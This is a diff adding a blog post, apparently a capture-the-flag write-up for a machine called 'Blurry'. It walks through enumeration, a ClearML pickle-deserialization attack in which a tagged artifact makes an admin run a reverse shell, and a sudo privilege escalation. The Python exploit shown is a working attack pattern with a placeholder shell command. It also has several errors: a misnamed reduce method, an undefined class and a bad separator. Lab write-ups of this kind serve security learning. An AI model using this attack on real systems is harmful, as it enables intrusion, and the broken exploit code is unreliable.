@@ -1,0 +1,81 @@
+---
+layout: post
+title: "Blurry 8e433db17c4a43b790fb0030a3f23d14"
+date:   2025-07-12 12:05:57 -0400
+categories: writeups
+---
+
+# Blurry
+
+# 1. Enumeration
+
+As we used to, we start enumerating ports
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled.png' | relative_url }})
+
+There are just two port open, the 80 port is redirecting to a subdomain, which indicates that probably there are other subdomains running on it.
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_1.png' | relative_url }})
+
+We can register ourselves and follow the instructions to authenticate us, and prepare crearml to execute tasks through it.
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_2.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_3.png' | relative_url }})
+
+Let’s search for another subdomains
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_4.png' | relative_url }})
+
+Configure clearml to authenticate using .conf file
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_5.png' | relative_url }})
+
+There is a public chat inside of one subdomain
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_6.png' | relative_url }})
+
+# 2. User flag
+
+Now we have a clue, it is necessary to use review tag to make that an admin open the artifact file which is the object that have the reverse shell
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_7.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_8.png' | relative_url }})
+
+Prepare the exploit
+
+```python
+import os
+from clearml import Task
+import base64
+import time
+
+task = Task.init(project_name='Black Swan', task_name='Nombree', tags=['review']. task_type=Task.TaskTypes.data_processing)
+
+class Tricp:
+	def _reduce_(self):
+		cmd = 'rev shell'
+		return os.system, (cmd,)
+		
+rng_name = base64.b64encode(str(time.time()).encode()).decode
+task.upload_artifact(name=rng_name,artifact_object=Pickle())
+
+task.execute_remotely(queue_name='default')
+```
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_9.png' | relative_url }})
+
+Execute it and get user flag
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_10.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_11.png' | relative_url }})
+
+# 3.Priv esc
+
+We can see that we have sudo permission to run evaluate model, and we have permise to delete that file so just delete it and create another one performing a shell in bash using python, then run it as sudo and got the root flag
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_12.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988/06705de6-cdc9-4a88-8879-4a03e3f03416-export-09f465a8-166f-4109-8879-1c8b0e42d988_Untitled_13.png' | relative_url }})
